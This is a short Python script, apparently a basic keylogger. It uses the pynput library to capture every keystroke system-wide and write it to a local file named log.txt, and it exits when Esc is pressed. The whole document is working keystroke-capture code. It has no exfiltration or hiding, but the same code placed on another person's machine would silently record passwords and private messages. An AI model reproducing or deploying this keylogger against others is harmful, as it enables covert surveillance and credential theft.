from pynput.keyboard import Listener
import sys

f = open("log.txt", 'w')

def press(key):
    key = str(key)

    if key == 'Key.space':
        key = " "
    elif key == 'Key.esc':
        f.write('\0')
        f.close()
        sys.exit()
    elif key == 'Key.backspace':
        key = "<-del-"
    elif key == 'Key.shift' or key == 'Key.shift_r':
        key = 'SHIFT+'
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.tab':
        key = '\t'

    f.write(key.replace("'", ""))

with Listener(on_press=press) as l:
    l.join()
